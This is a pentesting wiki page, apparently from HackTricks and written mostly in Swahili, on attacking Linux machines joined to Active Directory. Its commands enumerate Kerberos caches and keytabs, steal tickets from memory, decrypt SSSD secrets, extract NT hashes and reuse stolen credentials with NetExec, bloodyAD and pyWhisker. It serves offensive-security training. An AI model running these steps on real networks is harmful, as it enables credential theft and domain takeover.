# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux machine pia inaweza kuwa ndani ya mazingira ya Active Directory.

Linux machine ndani ya AD inaweza **kuhifadhi Kerberos material ndani ya kifaa**: user ccaches, machine/service keytabs, na SSSD-managed secrets. Hizi artefacts kwa kawaida zinaweza kutumiwa tena kama credential nyingine yoyote ya Kerberos. Ili kusoma nyingi kati yake utahitaji kuwa mmiliki wa user wa ticket au **root** kwenye machine.

## Enumeration

### AD enumeration from linux

Ikiwa una access kwenye AD katika linux (au bash kwenye Windows) unaweza kujaribu [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) ili enumerate AD.

Unaweza pia kuangalia ukurasa ufuatao ili kujifunza **njia nyingine za enumerate AD kutoka linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA ni open-source **alternative** kwa Microsoft Windows **Active Directory**, hasa kwa mazingira ya **Unix**. Inaunganisha **LDAP directory** kamili na MIT **Kerberos** Key Distribution Center kwa management inayofanana na Active Directory. Kwa kutumia Dogtag **Certificate System** kwa CA & RA certificate management, inaunga mkono **multi-factor** authentication, ikijumuisha smartcards. SSSD imeunganishwa kwa Unix authentication processes. Jifunze zaidi kuihusu katika:


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Kabla ya kugusa tickets, tambua **jinsi host ilijiunga na AD** na **wapi Kerberos material imehifadhiwa kwa kweli**. Kwenye Linux hosts za kisasa hili kwa kawaida hushughulikiwa na `realmd` + `adcli` + `sssd`, si tu flat files ndani ya `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Ini kwa haraka inakuambia kama host inaamini AD, kama SSSD inahifadhi identities au tickets, na kama **machine/service keytabs** au **KCM secrets** zinapatikana kwa ajili ya abuse.

## Playing with tickets

### Pass The Ticket

Katika ukurasa huu utaona maeneo tofauti ambako unaweza **kupata kerberos tickets ndani ya linux host**, katika ukurasa ufuatao unaweza kujifunza jinsi ya kubadilisha fomati hizi za CCache tickets kuwa Kirbi (fomati unayohitaji kutumia kwenye Windows) na pia jinsi ya kufanya PTT attack:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Kama unataka workflows za kukusanya tickets maalum za Linux (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), angalia ukurasa mahususi:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

Faili za CCACHE ni fomati za binary za **kuhifadhi Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` bado ni ya kawaida, lakini deployments za kisasa za Linux pia hutumia `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, au `KCM:%{uid}`. Angalia variable ya mazingira ya **`KRB5CCNAME`** na mpangilio wa `default_ccache_name` kabla ya kudhani tickets zinaishi kwenye `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE ticket reuse from keyring

**Kerberos tickets zilizohifadhiwa katika memory ya process zinaweza kutolewa**, hasa wakati ptrace protection ya machine imezimwa (`/proc/sys/kernel/yama/ptrace_scope`). Tool muhimu kwa ajili ya hili ipo katika [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), ambayo hurahisisha extraction kwa kuingiza kwenye sessions na ku-dump tickets kwenda `/tmp`.

Ili configure na kutumia tool hii, hatua zifuatazo zinafuatwa:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Utaratibu huu utajaribu kuingiza kwenye sessions mbalimbali, ukiashiria mafanikio kwa kuhifadhi tickets zilizotolewa katika `/tmp` kwa kutumia mpangilio wa majina wa `__krb_UID.ccache`.

### CCACHE ticket reuse kutoka SSSD KCM

SSSD huhifadhi nakala ya database kwenye path `/var/lib/sss/secrets/secrets.ldb`. Key inayolingana huhifadhiwa kama faili iliyofichwa kwenye path `/var/lib/sss/secrets/.secrets.mkey`. Kwa kawaida, key inaweza kusomwa tu ikiwa una ruhusa za **root**.

Kuitisha **`SSSDKCMExtractor`** kwa vigezo vya --database na --key kutachambua database na **decrypt the secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
The **credential cache Kerberos blob inaweza kubadilishwa kuwa faili ya Kerberos CCache** inayoweza kutumika ambayo inaweza kupitishwa kwa Mimikatz/Rubeus.

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Dondoa accounts kutoka /etc/krb5.keytab

Service account keys, muhimu kwa services zinazofanya kazi kwa root privileges, huhifadhiwa kwa usalama ndani ya faili za **`/etc/krb5.keytab`**. Keys hizi, kama passwords za services, zinahitaji usiri mkali.

Ili kukagua yaliyomo ya faili ya keytab, **`klist`** inaweza kutumika. Kwenye Linux, `klist -k -K -e` huonyesha principals, key version numbers, encryption types, na raw key material. Ikiwa aina ya key ni **23 / RC4-HMAC**, thamani ya key pia ni **NT hash** ya principal hiyo.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Kwa watumiaji wa Linux, **`KeyTabExtract`** hutoa uwezo wa kutoa RC4 HMAC hash, ambayo inaweza kutumiwa kwa NTLM hash reuse. Kumbuka kwamba hii husaidia tu wakati keytab bado ina **etype 23 / RC4-HMAC** material. Katika mazingira ya **AES-only** huenda usipate reusable NT hash, lakini bado unaweza authenticate moja kwa moja kwa kutumia keytab kupitia Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Kwenye macOS, **`bifrost`** hutumika kama zana ya uchambuzi wa faili za keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Kwa kutumia taarifa za akaunti na hash zilizotolewa, miunganisho kwa servers inaweza kuanzishwa kwa kutumia tools kama **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Tumia tena machine account kutoka `/etc/krb5.keytab`

Kwenye mifumo iliyounganishwa kwa `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` kwa kawaida huwa na **computer account** na **host/service principals** mmoja au zaidi. Ukiwa na **root**, usiifanye tu dump: tumia mojawapo ya principals zilizoorodheshwa na `klist -k` kuomba TGT na kufanya kazi kama Linux host yenyewe.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Hii ni muhimu sana hasa wakati **computer object** yenyewe imepewa delegated rights katika AD au wakati host inaruhusiwa kupata secrets nyingine kama **gMSA**.

### Tumia tena stolen Kerberos material na Linux-first AD tooling

Mara tu unapokuwa na `ccache` halali au keytab inayoweza kutumika, unaweza kufanya kazi dhidi ya AD **moja kwa moja kutoka Linux** bila kubadilisha kila kitu kuwa Windows formats kwanza. Zana nyingi za kisasa hukubali `KRB5CCNAME` / Kerberos auth kiasili:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Hii ni daraja zuri kati ya **Linux post-exploitation** na **AD object abuse**. Kwa njia za object-level abuse zenyewe, angalia:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Recent Linux deployments zinaweza kutumia **Managed Service Accounts** moja kwa moja kutoka AD. Kwa vitendo, hii inamaanisha kwamba baada ya ku-compromise Linux server, unaweza kupata si tu host keytab bali pia **service-specific keytabs** zilizotengenezwa kutoka gMSA. Maeneo ya kawaida ya kuangalia ni `/etc/gmsad.conf`, deployment-specific config files, na additional `*.keytab` files chini ya `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Hii inakupatia Kerberos identity inayoweza kutumika tena kwa SPNs zilizounganishwa na gMSA hiyo **bila kugusa endpoint yoyote ya Windows**. Kwa matumizi mabaya ya gMSA/dMSA upande wa **domain-side** baada ya kupata higher privileges katika AD, angalia:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
